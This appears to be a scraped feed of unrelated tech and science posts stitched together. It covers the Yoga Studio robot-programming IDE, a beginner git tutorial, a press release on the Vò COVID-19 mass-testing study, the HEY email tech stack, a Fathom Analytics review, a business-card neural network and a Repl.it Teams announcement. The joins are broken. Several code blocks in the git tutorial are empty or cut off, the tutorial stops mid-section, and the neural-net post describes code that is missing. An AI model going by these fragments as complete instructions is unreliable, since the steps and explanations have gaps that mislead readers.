Forbes list. Our product offers little value to them. They say the budget is full. </p><p>I may never figure out how to sell to struggling companies. And that maybe that’s ok.</p>

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I’ve been wanting to do a Show HN for my robotics developer tool <a href="https://gitlab.com/umbrellaresearch/yoga2/">Yoga Studio</a> for a while.
But given that:</p>
<ul>
  <li>it’s for programming robots</li>
  <li>you probably don’t have a compatible robot</li>
</ul>

<p>it wasn’t something you could immediately play with.</p>

<p><img src="https://yoga.dev/images/greppy1tlb_300px.jpg" width="150" height="317"></p>

<p>Now, you have <strong>remote access to a robot</strong> you can program with it! The 2-wheeled balancing robot (“Greppy”) is sitting in
our California warehouse ready to run your code. You’ll need to download and build
Yoga Studio to control it – see full instructions below.</p>

<p>When you check out the code, it includes an <code>examples/greppy</code> directory with some code to
make the robot balance and drive around. When you start the app and click “Run Live”, it:</p>

<ul>
  <li>Connects to the robot through a port in our firewall.</li>
  <li>Acquires a lock (only one user at a time. Don’t bogart the robot!)</li>
  <li>Uploads <strong>your code</strong> to the robot (start with the example code, but you can hack it up later.)</li>
  <li>The robot compiles and runs your code</li>
  <li>The robot <strong>streams live traces</strong> of all the sensors and computations done by the code, and also a video from a camera looking at the robot.</li>
  <li>You can <strong>drive the robot</strong> with WASD.</li>
  <li>The bottom pane shows the code running, along with <strong>current values for every expression</strong>.</li>
  <li>In the code pane, numerical parameters are overlaid with gui sliders. <strong>You can drag them around and they’re immediately updated on the robot</strong>.</li>
  <li>When you’re done, hit Escape and it’ll download the high-res traces to your machine.</li>
  <li>While viewing a saved trace, you can adjust parameters and it’ll overlay a counterfactual graph of <strong>what the code would have done</strong> with the new parameters.</li>
  <li>The Yoga language is fully <strong>differentiable WRT its parameters</strong> so you can click on an output variable
 (like motor speed) and it’ll tell you what parameters you should change in which direction to affect it.</li>
</ul>

<h3 id="motivation">Motivation</h3>

<p>This is part of a project to make programming robots faster. My experience is that tuning the parameters of
robot control code takes 10x longer than getting the structure of the code right, so I designed a
language + IDE with a single-minded focus on solving the parameter problem. The language is:</p>

<ul>
  <li>Differentiable with respect to its parameters</li>
  <li>Fast (statically typed and compiled)</li>
  <li>Purely functional (no side effects)</li>
  <li>Close enough to C for your editor’s syntax highlighting to work.</li>
</ul>

<p>The compiler extracts anything marked as a parameter into a separate data structure, with a link to the location
in the source code they came from. When the IDE renders the Yoga code, it shows the parameters as sliders.</p>

<table>
  <thead>
    <tr>
      <td> Code Editor </td>
      <td> Yoga Studio </td>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>

      </td>
    </tr>
  </tbody>
</table>

<p>Here’s what Yoga Studio looks like when controlling Greppy:</p>

<p><img src="https://yoga.dev/images/ScreenshotAnno@2x.png" width="740" height="485"></p>

<p>Feel free to hack on the code in <a href="https://gitlab.com/umbrellaresearch/yoga2/-/tree/master/examples/greppy">examples/greppy</a>. See if you can make the robot do something cool!</p>

<p>Read more in the <a href="https://yoga.dev/yoga/">Reference Manual</a>.</p>



<p>It should work on either Mac or Linux (Recently tested on Catalina and Ubuntu 19.10 &amp; 20.04).</p>

<div><div><pre><code>git clone <span>--recurse-submodules</span> https://gitlab.com/umbrellaresearch/yoga2.git
<span>cd </span>yoga2
git config submodule.recurse <span>true
</span>make install.deps <span># On Mac, uses Brew. On Linux, apt-get.</span>
make <span>-j8</span>
</code></pre></div></div>

<p>Now fire up the Greppy example code:</p>

<div><div><pre><code>bin/yogastudio examples/greppy/main.yoga
</code></pre></div></div>

<p>Click “Run live on on robot greppy1”.</p>

<p>It’ll then open up the real-time scope, showing live-scrolling graphs of several variables over time. And the video will show the robot starting to balance.</p>

<p>The greppy example code lets you drive the robot from your keyboard with WASD.</p>

<p>Try going to the <code>balance.yoga</code> file, and adjusting the first 2 parameters in the RHS of the assignment to <code>accel</code>. Those are roughly the P and D parameters of the main balance feedback loop. Start with
small adjustments and work up to large ones! The robot is attached to the ceiling with a rope, so you can’t do too much damage.</p>

<p>Hit Esc to end the live session, and switch to the recorded traces it just captured.</p>

<p>You can scroll back and forth in the recorded traces by scrolling left-right with your mouse. You can add or remove traces from the graph with the checkboxes on the left.</p>

<p>While looking at recorded traces, you can still drag parameters, but now rather than updating on the live robot, they <strong>redo the entire run</strong>, overlaying the counterfactual graphs. That is, it shows what the code would have done with the new parameters given the same inputs from the hardware.</p>

<p>To start another run on the hardware, hit Cmd-L (Ctl-L on Linux).</p>

<p>When you’re happy with the parameters, click “Save params” to write them back to the source code. If you’re following the example, that’ll be in the checked out directory under examples/greppy/</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In the beginning of times, there were centralized version control systems (<code>SVN</code> and <code>Perforce</code> are examples). This means that there is a server somewhere that contains all our code and the history of all the changes. If someone needs to work on that codebase they do a <code>checkout</code> (typically of the main branch) and they will get the newest version of all the files.</p>

<p>If the server looks something like this (Every letter represents a different commit):</p>

<p><a href="https://ncona.com/images/posts/source-control-server.png"><img src="https://ncona.com/images/posts/source-control-server.png" alt="Source control server"></a></p>

<p>When a developer checks out <code>main</code>, they will get only the files at <code>D</code>, the commit history exists only in the server.</p>

<p>This has a two main disadvantages:</p>

<ul>
  <li>It is not possible to create local branches. If a developer needs a branch they have to push it to the server</li>
  <li>If the server explodes, all the history is lost</li>
</ul>

<!--more-->

<p>Git is a distributed version control system. What this means is that a developer <code>clones</code> a repo before it starts working on it. The developer’s machine will contain not only the files necessary for working, but also the history of all commits. By doing this, we avoid the two problems mentioned above.</p>

<h2 id="creating-a-repo">Creating a repo</h2>

<p>If we want to create a new repo:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>mkdir </span>new-repo
<span>cd </span>new-repo
git init
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="creating-a-commit">Creating a commit</h2>

<p>Once we are on a repo, the next thing we want to do is create a commit. A commit is an entry in the history of our repo. Let’s start by creating a file:</p>



<p>We can use <code>git status</code> to see the state of our repo, compared to the previous committed state:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
</pre></td><td><pre><span>$ </span>git status
On branch master

No commits yet

Untracked files:
  <span>(</span>use <span>"git add &lt;file&gt;..."</span> to include <span>in </span>what will be committed<span>)</span>

	README.md

nothing added to commit but untracked files present <span>(</span>use <span>"git add"</span> to track<span>)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The command tells us that we are standing in <code>master</code> and that we have a file that is not yet being tracked.</p>

<p>In git, the commit process has two stages:</p>

<ol>
  <li>Select what we want to include in the commit</li>
  <li>Commit the changes</li>
</ol>

<p>When we select what we want to commit we say we are moving it to the <code>staging</code> area. Let’s do that:</p>



<p>We can see that the status changed:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
</pre></td><td><pre><span>$ </span>git status
On branch master

No commits yet

Changes to be committed:
  <span>(</span>use <span>"git rm --cached &lt;file&gt;..."</span> to unstage<span>)</span>

	new file:   README.md
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can now commit the change:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>git commit <span>-m</span> <span>'Added readme file'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="looking-at-the-history">Looking at the history</h2>

<p>If we want to see the list of commits from where we are standing:</p>



<p>The output looks something like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>$ </span>git log
commit 0eba2722139ff6e91baaeb6540d4ce76c5e33d48 <span>(</span>HEAD -&gt; master<span>)</span>
Author: User Usernikov &lt;user@userni.kov&gt;
Date:   Thu Jun 25 21:53:16 2020 +1000

    Added readme file
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I personally prefer a more compact view that can be achived with this command:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>git log <span>--graph</span> <span>--all</span> <span>--pretty</span><span>=</span>format:<span>'%Cred%h -%C(yellow)%d%Creset %s %Cgreen(%ci) %C(bold blue)&lt;%an (%ae)&gt;'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The output looks like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>* 0eba272 - (HEAD -&gt; master) Added readme file (2020-06-25 21:53:16 +1000) &lt;User Usernikov (user@userni.kov)&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Because that’s a very long command, I prefer to create an alias for it. To create an alias:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>git config <span>--global</span> alias.lg <span>"log --graph --all --pretty=format:'%Cred%h -%C(yellow)%d%Creset %s %Cgreen(%ci) %C(bold blue)&lt;%an (%ae)&gt;'"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The command creates a git alias named <code>lg</code>. Now, we can use this command:</p>



<h2 id="branches">Branches</h2>

<p>In the section above, we can see <code>0eba272 - (HEAD -&gt; master)</code> as part of the log ouput. There are a few important pieces of information.</p>

<ul>
  <li><code>0eba272</code> - The commit hash. A unique identifier for each commit</li>
  <li><code>HEAD</code> - Represents the commit where we are currently standing</li>
  <li><code>master</code> - Branch name</li>
</ul>

<p>From this information we can say that <code>master</code> is currently located at <code>0eba272</code> and our <code>HEAD</code> is pointing to master. Let’s create a new branch:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>$ </span>git branch first-branch
<span>$ </span>git lg
<span>*</span> 0eba272 - <span>(</span>HEAD -&gt; master, first-branch<span>)</span> Added readme file <span>(</span>2020-06-25 21:53:16 +1000<span>)</span> &lt;User Usernikov <span>(</span>user@userni.kov<span>)&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We created a new branch, but as we can see, <code>HEAD</code> is still pointing to <code>master</code>. Let’s see what happens if we create a commit:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>$ </span><span>echo</span> <span>"Git demo"</span> <span>&gt;&gt;</span> README.md
<span>$ </span>git add README.md
<span>$ </span>git commit <span>-m</span> <span>'Add title to readme'</span>
<span>$ </span>git lg
<span>*</span> 0af5c64 - <span>(</span>HEAD -&gt; master<span>)</span> Add title to readme <span>(</span>2020-06-25 22:03:42 +1000<span>)</span> &lt;User Usernikov <span>(</span>user@userni.kov<span>)&gt;</span>
<span>*</span> 0eba272 - <span>(</span>first-branch<span>)</span> Added readme file <span>(</span>2020-06-25 21:53:16 +1000<span>)</span> &lt;User Usernikov <span>(</span>user@userni.kov<span>)&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can see that a new commit was created and both <code>HEAD</code> and <code>master</code> are now in that commit. Our <code>first-branch</code> was left behind. If we want to create a branch and move to it immediately, we can use:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>$ </span>git checkout <span>-b</span> second-branch
<span>$ </span>git lg
<span>*</span> 0af5c64 - <span>(</span>HEAD -&gt; second-branch, master<span>)</span> Add title to readme <span>(</span>2020-06-25 22:03:42 +1000<span>)</span> &lt;User Usernikov <span>(</span>user@userni.kov<span>)&gt;</span>
<span>*</span> 0eba272 - <span>(</span>first-branch<span>)</span> Added readme file <span>(</span>2020-06-25 21:53:16 +1000<span>)</span> &lt;User Usernikov <span>(</span>user@userni.kov<span>)&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This time <code>HEAD</code> moved. It’s now pointing to <code>second-branch</code>. To switch branches:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>$ </span>git checkout first-branch
<span>$ </span>git lg
<span>*</span> 0af5c64 - <span>(</span>second-branch, master<span>)</span> Add title to readme <span>(</span>2020-06-25 22:03:42 +1000<span>)</span> &lt;User Usernikov <span>(</span>user@userni.kov<span>)&gt;</span>
<span>*</span> 0eba272 - <span>(</span>HEAD -&gt; first-branch<span>)</span> Added readme file <span>(</span>2020-06-25 21:53:16 +1000<span>)</span> &lt;User Usernikov <span>(</span>user@userni.kov<span>)&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Let’s se what happens when we create a commit from here:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>$ </span><span>touch </span>other.file

</pre></td></tr></tbody></table></code></pre></div></div>

<p>The alias we created to see the history, has the advantage of showing us places where the history branches out. To see a list of all our branches:</p>



<h2 id="remotes">Remotes</h2>

<p>When we create a repo using <code>git init</code>, the repo exists only in the folder where we created it. Usually we want to host our repos in a centralized location so it acts as the source of truth for a team.</p>

<p>One interesting thing about centralized source code locations is that nobody works in that clone directly, it’s just a place for integration. The location where everybody pushes doesn’t have a working directory, it just keeps track of the history of all files. This is referred as a <code>bare</code> repo. We can create a bare repo:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

<span>cd</span> ..
git clone new-repo main-repo <span>--bare</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This creates a new folder called <code>main-repo</code>, that contains something very similar to <code>new-repo/.git</code>.</p>

<p>Let’s say we want to use this new clone as the souce of truth for our repo. We would need to make <code>new-repo</code> aware of it.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span># Assuming we are in `new-repo` folder</span>
git remote add origin ../main-repo/
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The main <code>remote</code> for a repo, is usually called <code>origin</code>, which is what we called our remote. We can have multiple remotes, but it’s common to have a single one. To see our remotes and where they are hosted:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>$ </span>git remote <span>-v</span>
origin	../main-repo/ <span>(</span>fetch<span>)</span>
origin	../main-repo/ <span>(</span>push<span>)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If we <code>fetch</code> from <code>origin</code>, we will get all remote branches:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>$ </span>git fetch origin
From ../main-repo
 <span>*</span> <span>[</span>new branch]      first-branch  -&gt; origin/first-branch
 <span>*</span> <span>[</span>new branch]      master        -&gt; origin/master
 <span>*</span> <span>[</span>new branch]      second-branch -&gt; origin/second-branch
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And we can see them when we list all the branches (<code>-a</code> includes remote branches):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre><span>$ </span>git branch <span>-av</span>
<span>*</span> first-branch                 07c7128 Added other file
  master                       0af5c64 Add title to readme
  second-branch                0af5c64 Add title to readme
  remotes/origin/first-branch  07c7128 Added other file
  remotes/origin/master        0af5c64 Add title to readme
  remotes/origin/second-branch 0af5c64 Add title to readme
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It’s very common to have the <code>master</code> branch track <code>origin/master</code>. What this means is that the local <code>master</code> will by default be pushed to <code>origin/master</code> and changes from <code>origin/master</code> will be integrated into local <code>master</code> when they are pulled. Let’s make our <code>master</code> track <code>origin/master</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>$ </span>git checkout master
Switched to branch <span>'master'</span>

<span>$ </span>git branch <span>-u</span> origin/master
Branch <span>'master'</span> <span>set </span>up to track remote branch <span>'master'</span> from <span>'origin'</span><span>.</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can now commit a change to master and push it to our remote:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

<p>If we look at the history, we’ll see that both <code>master</code> and <code>origin/master</code> are positioned in the same place:</p>

<h2 id="merging">Merging</h2>

<p>We can see in our history that <code>first-branch</code> is not part of the master branch. To add it to master, we need to merge it.</p>

They also argue that widespread testing, isolating infected people, and a community lockdown effectively stopped the outbreak in its tracks.</p><p>The town of Vò, with a population of nearly 3,200 people, experienced Italy’s first COVID-19 death on 21 February 2020. The town was put into immediate quarantine for 14 days. During this time, researchers tested most of the population for infection of SARS-CoV-2, the virus that causes COVID-19, both at the start of the lockdown (86 percent tested) and after two weeks (72 percent tested).</p><p>The testing revealed that at the start of the lockdown, 2.6 percent of the population (73 people) were positive for SARS-CoV-2, while after a couple of weeks only 1.2 percent (29 people) were positive. At both times, around 40 percent of the positive cases showed no symptoms (asymptomatic). The results also show it took on average 9.3 days (range of 8-14 days) for the virus to be cleared from someone’s body.</p><p>None of the children under ten years old in the study tested positive for COVID-19, despite several living with infected family members. This is in contrast to adults living with infected people, who were very likely to test positive.</p><p>As a result of the mass testing any positive cases, symptomatic or not, were quarantined, slowing the spread of the disease and effectively suppressing it in only a few short weeks.</p><p>Co-lead researcher Professor Andrea Crisanti, from the Department of Molecular Medicine of the University of Padua and the Department of Life Sciences at Imperial, said: “Our research shows that testing of all citizens, whether or not they have symptoms, provides a way to manage the spread of disease and prevent outbreaks getting out of hand. Despite ‘silent’ and widespread transmission, the disease can be controlled.”</p><p>The results of the mass testing programme in Vò informed policy in the wider Veneto Region, where all contacts of positive cases were offered testing. “This testing and tracing approach has had a tremendous impact on the course of the epidemic in Veneto compared to other Italian regions, and serves as a model for suppressing transmission and limiting the virus’ substantial public health, economic and societal burden,” added Professor Crisanti.</p><p>As well as identifying the proportion of asymptomatic cases, the team also found that asymptomatic people had a similar 'viral load’ - the total amount of virus a person has inside them - as symptomatic patients.</p><p>Viral load also appeared to decrease in people who had no symptoms to begin with but later developed symptoms, suggesting that asymptomatic and pre-symptomatic transmission could contribute significantly to the spread of disease, making testing and isolating even more important in controlling outbreaks.</p><p>Co-lead researcher Dr Ilaria Dorigatti, from the MRC Centre for Global Infectious Disease Analysis, Jameel Institute (J-IDEA), at Imperial College London, said: “The Vò study demonstrates that the early identification of infection clusters and the timely isolation of symptomatic as well as asymptomatic infections can suppress transmission and curb an epidemic in its early phase. This is particularly relevant today, given the current risk of new infection clusters and of a second wave of transmission.</p><p>"There are still many open questions about the transmission of the SARS-CoV-2 virus, such as the role of children and the contribution of asymptomatic carriers to transmission. Finding answers to these questions is crucial to identifying targeted and sustainable control strategies to combat the spread of SARS-CoV-2 in Italy and around the world.”</p><p>Professor Enrico Lavezzo, from the Department of Molecular Medicine at the University of Padua said: “The result concerning asymptomatic carriers is key. We took a picture of the Vò population and found that about half of the population testing positive had no symptoms at the time of testing and some of them developed symptoms in the following days. This tells us that if we find a certain number of symptomatic people testing positive, we expect the same number of asymptomatic carriers that are much more difficult to identify and isolate.</p><p>"The fact that the viral load is comparable between symptomatic and asymptomatic carriers means even asymptomatic infections have the potential to contribute to transmission, as some of the reconstructed chain of transmission obtained from the detailed contact tracing conducted in Vò confirmed.</p><p>"On the one hand, it is likely that a symptomatic infection transmits large quantities of virus, for example via coughing, but it is also reasonable to think that symptoms may induce a person with a symptomatic infection to stay at home, limiting the number of contacts and hence the transmission potential. On the other hand, someone with an asymptomatic infection is entirely unconscious of carrying the virus and, according to their lifestyle and occupation, could meet a large number of people without modifying their behaviour.”</p><p>–</p><p><b>Source: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.eurekalert.org%2Fpub_releases%2F2020-06%2Ficl-wsr063020.php&amp;t=M2M1NjU2MjRkZjIyNmIzNTU0N2JhZTlhY2IxNDY1MzEzODllZDk4MCx2QUpQNjFOdw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F622389960556806144%2Fcovid19-asymptomatic-cases-study&amp;m=0">Imperial College London</a></b></p><p><b>Full study:</b>&nbsp;“Suppression of a SARS-CoV-2 outbreak in the Italian municipality of Vo’”, <i>Nature</i>.</p><p><a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fdx.doi.org%2F10.1038%2Fs41586-020-2488-1&amp;t=YjJhODJjNGNiOTM0ODVhM2FjMTE4MTBhYzAyYmMyYjYxYTNjM2I1MCx2QUpQNjFOdw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F622389960556806144%2Fcovid19-asymptomatic-cases-study&amp;m=0">http://dx.doi.org/10.1038/s41586-020-2488-1</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/615500611887235072/social-distancing-2022">New study: Social distancing could be needed until 2022</a></p>

<p>The launch of the Hey email platform was one of the largest application launches in 2020.  It was reported that they had over 150k users signed up, so I thought it would be interesting to see what we could find about the tech stack.  Luckily <a href="https://twitter.com/dhh">dhh</a> shared some good information.</p>
<h2>The HEY Stack</h2>
<p>One interesting piece of information was that someone did some investigation and <em>haystack</em> was the codename for the project and <a href="https://basecamp.com/">basecamp</a> had registered <a href="https://twitter.com/wongmjane/status/1231253948415135746">haystack.com</a> also.</p>
<p>It’s no suprise that this is a <a href="https://rubyonrails.org/">Ruby on Rails</a> app since dhh is the creator of rails.  They are using <a href="https://stimulusjs.org/">Stimulus</a> as the javascript framework, <a href="https://github.com/turbolinks/turbolinks">turbolinks</a> to speed up page loads, <a href="https://github.com/basecamp/trix">trix</a> for the editor and as yet unspecified <strong>NEW MAGIC</strong> on the front end.</p>
<p><a href="https://www.mysql.com/">MySQL</a> for the database, plus <a href="https://vitess.io/">Vitess</a> for DB sharding.  <a href="https://redis.io/">Redis</a> for caching and short lived data. <a href="https://www.elastic.co/">ElasticSearch</a> for searching and all on <a href="https://kubernetes.io/">Kubernetes</a> running on <a href="https://aws.amazon.com/">AWS</a>.

<p>I use <a href="https://usefathom.com/ref/XBN5MO">Fathom Analytics</a> to track users on every website and landing page I build.</p>
<p>Unlike Google Analytics, it's not free. I also get far less data from Fathom.</p>
<p>I happily pay $14/month for less data.</p>
<p>Fathom Analytics is far more simple. I don't get distracted by going down rabbit holes looking for "insights" or vanity metrics. I also don't invade my readers' privacy with cross-site tracking or cookies.</p>
<p>The interface itself can be understood in a single glance. Once I look at my metrics, I move on with my day to create more content. Knowing where my users came from and how long they stayed is more than enough data to understand my audience. </p>
<p>Data overload isn't valuable. It's overwhelming and distracting.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple interface</li>
<li>Beautiful design</li>
<li>Easy to setup</li>
<li>Simple goal tracking</li>
<li>Privacy focused</li>
<li>No cookie popups required</li>
<li>Multiple sites on one account/subscription</li>
<li><a href="https://usefathom.com/blog/google-analytics-seo">Doesn't mess with SEO</a></li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Paid</li>
<li>Not enough data for larger organizations with complex ad campaigns</li>
</ul></div></div>]]>

I recently came across Andrew Kensler's fascinating <a href="https://fabiensanglard.net/rayTracing_back_of_business_card/">Business Card Raytracer</a>. His code, in just 1337 bytes, generates a full raytraced image complete with depth of field, reflections, a sky gradient, and a textured floor. In a similar vein, I set out to create a full neural network that could fit on the back of a business card. The code below is the result, creating a 3-layer fully-connected neural network with leaky-relu activations and training it to generate a small image of my name.

You can view the output here by clicking the play button. (I hate to admit it's not actually running the code in the browser :P, but you'll see the same or similar output if you run the code yourself).

<p>
The code is only 878 characters, and (as mentioned previously) creates and trains a small neural network. I'm sure it's possible to make it shorter still, but I was happy enough to get this far! I think making it any shorter would make it impossible to reason about, now at least new layers can be added or removed easily and the forward/back propagation is pretty neat! (I'm not biased I swear).
</p>

<p>
Here's a small breakdown of how it works.

Define simple imports and typedefs. The two floats define constants used for the 'leak' of leaky relu, (I.e. the \(K\) in \(f(x) = max(Kx, x)\)), and the learning rate.

Start of the layer struct <code>L</code>. The constructor takes the input and output sizes, and initializes a weights matrix in an approximation of <a href="https://towardsdatascience.com/weight-initialization-in-neural-networks-a-journey-from-the-basics-to-kaiming-954fb9b47c79">Xavier Initilization</a>.

Two functions for the layer struct. <code>F</code> performs forward propagation, taking the input vector and returning the output. Some values are cached for later. <code>B</code> performs backward propagation, taking the derivative of the output, updating the weights matrix, and returning the derivative of the input. Both are using leaky relu.

Start of main, create a 3 layer network. The network takes 40 values for input, and has two hidden layers with 50 nodes each, and returns single value at the end. The input is based on the x,y coordinate currently predicted, and the output is a single value for whether this pixel should be a space or '#'. At the end we open the training loop, which runs for 500336 iterations, which is a multiple of the output size; 243.

From the output of the network, <code>y</code>, calculate \(\frac{dE}{dy}\). We use mean squared error, so the derivative is just \(2(y-\hat{y})\), where \(\hat{y}\) is the target value and is encoded in a string. When written with non-ascii characters this is a lot shorter.

Output: Choose different chars based on how high/low the value predicted is. Then print special characters if we're at the end of a line (<code>i%27==0</code>) or we've done a full epoch (<code>i%243==0</code>). Finally, when we're finished, <code>i==0</code> and we print the end text.

On reddit <code>/u/pm_me_P_vs_NP_papers</code> managed to shorten the code even further - by 50 bytes! Making the final length only 828 bytes and 22 lines. You can read about their optimizations <a href="https://www.reddit.com/r/tinycode/comments/hiscpb/business_card_neural_network/fwkg9i9?utm_source=share&amp;utm_medium=web2x">HERE!</a>

<p>
Thanks for reading! I'd love to hear suggestions on how to make it shorter, or any other ideas.

		<p>We started Repl.it to break down what we thought of as needless barriers to start coding. Naturally, our first product was the repl -- a simple editor and console for evaluating code. Turns out that’s all our users needed to learn enough coding to make meaningful programs. From there, Repl.it started to grow incredibly fast among students, developers, and educators. As we watched what our most active users did with the platform, a pattern emerged around coding in the classroom: teachers would prepare a doc or a PDF with instructions and a base repl for their students to fork. Students then would open the PDF side-by-side with the repl and start coding. When finished, they would copy the link and email it back to their teachers. Finally, teachers would block off an afternoon to evaluate and give feedback on their students’ code. The process, while better than using a local IDE and passing around files, seemed tedious and we wanted to solve it -- that’s how <a href="https://repl.it/classroom">Repl.it Classroom</a> emerged.</p>
<p>Repl.it Classroom digitized and streamlined the workflow teachers already had in the classroom. However, although teachers loved the experience and Classroom began to grow a slight tension emerged: Classroom used a custom environment which was hard to evolve in tandem with the repl environment. Right now repls are so far ahead in terms of IDE and runtime features that it makes more sense to consolidate and build our education platform on top of repls. Especially with the introduction of Multiplayer, we’ve seen teachers use both -- Classroom for small assignments and repls for projects. This works okay but the experience feels disjointed and hard to manage. That’s why today we’re excited to introduce Repl.it Teams, specifically Repl.it Teams for education which is jam-packed with features that will make teaching and collaborating on Repl.it nothing short of a seamless and amazing experience. </p>
<p><em>We believe that by propelling coding out of the old world of IDE setup and emailing code files, Repl.it Teams will be seen as the most significant innovation in CS and programming education.</em></p>
<p>In this post, we’ll go over what upgrading to Teams for education will get you, some details on pricing, and release timeline and roadmap.</p>
<h2 id="multiplayer-by-default">Multiplayer by default</h2>
<p>Multiplayer is the fastest growing feature on Replit. Teachers and students who already use Google Docs will instantly see how game-changing this is for coding. Especially now, with the rise of distance learning, it’s more important than ever to have a real-time collaboration system. </p>
<p>Where this gets really interesting with Teams is that repls created in the team are multiplayer by default, which means teachers can “drop-in” into the student repl and see what student(s) are working on and provide direction in real-time. Imagine teachers walking around the class looking at students coding and providing feedback behind their shoulders, but all virtually. We even took it a step further so that teachers have access to their students’ entire codebase and have the ability to run their code or fork it if they need to.</p>
<p><img src="https://cms.repl.it/assets/typing.gif" alt="multiplayer"></p>
<p>Upgrading to Teams will give you a sense of presence over your classroom and will make collaboration a breeze. </p>

<p>Right now in Classroom assignments are a flat list which gives very little in the way of organizing your course into units. With Teams, you’ll be able to create as many folders in your shared Team as you need to. You can also easily create your own private folders and repls and move repls into the shared team folder as needed.</p>
<p><img src="https://blog.repl.it/images/teams_edu/folders.png" alt="folders"></p>
<h2 id="conversations-around-code">Conversations around code</h2>
<p>One of the coolest things that Repl.it classrooms introduced to the teacher workflow is the assignment-submission workflow along with the notifications you get when your students submit an assignment. </p>
<blockquote><p lang="en" dir="ltr">So glad I made the jump to <a href="https://twitter.com/replit?ref_src=twsrc%5Etfw">@replit</a> for Higher computing. Young folk seem engaged, and I'm getting far too excited every time an assignment notification comes in 😄</p>— Fraser McKay (@mrmckaycomp) <a href="https://twitter.com/mrmckaycomp/status/1271426729358381057?ref_src=twsrc%5Etfw">June 12, 2020</a></blockquote> 

<p>We’re looking to go even further with Teams. We want to build a new way to have conversations around code. Comments on code should not be disembodied (like they are in the classroom). They should be contextual, and you should be able to easily mention your student, TA, or collaborator. </p>
<p><img src="https://blog.repl.it/images/teams_edu/mention.png" alt="mentions"></p>
<p>This is still in early development, but once it lands, upgrading to Team will give you the ability to give contextual feedback on code. </p>
<h2 id="code-centered-discussion-boards">Code-centered discussion boards</h2>
<p><a href="https://repl.it/talk">Repl Talk</a>, our code-centered forum, started out when we noticed our users wanted to help each other by answering questions, sharing programs, and finding mentors and collaborators. </p>
<p><img src="https://blog.repl.it/images/teams_edu/qa.png" alt="qa"></p>
<p>Teams will ship with its own discussion board instance private for you and your students for Q&amp;A, sharing, and discussion. </p>
<h2 id="expanded-language-support">Expanded language support</h2>
<p>You may have noticed that Classroom includes only a subset of the <a href="https://repl.it/languages">languages</a> that we support, and that’s because it takes a lot of effort to integrate a language into a bespoke environment. However, the Repl.it IDE is generic enough that languages are much easier to add. And even if we don’t support your favorite language, you’ll likely be able to get it working on our base bash repl--many of our users have done before. </p>
<p>Additionally, the repl text editor is based on VSCode’s Monaco which ships a lot of useful editing shortcuts, better syntax highlighting support, and, for some selection of languages, advanced <a href="https://blog.repl.it/intel">code intellisense</a>. </p>
<p>On top of that, you'll get access to the ever-increasing selection of <a href="https://repl.it/templates">starter templates</a> -- from frameworks like Rails and Django to personal blogs and bots.</p>
<p><img src="https://cms.repl.it/assets/templates.png" alt="languages"></p>
<p>In short, upgrading to Repl.it Teams will net you a 2x+ increase in language &amp; template selection and a much smoother editing experience.</p>
<h2 id="mobile-support">Mobile support</h2>
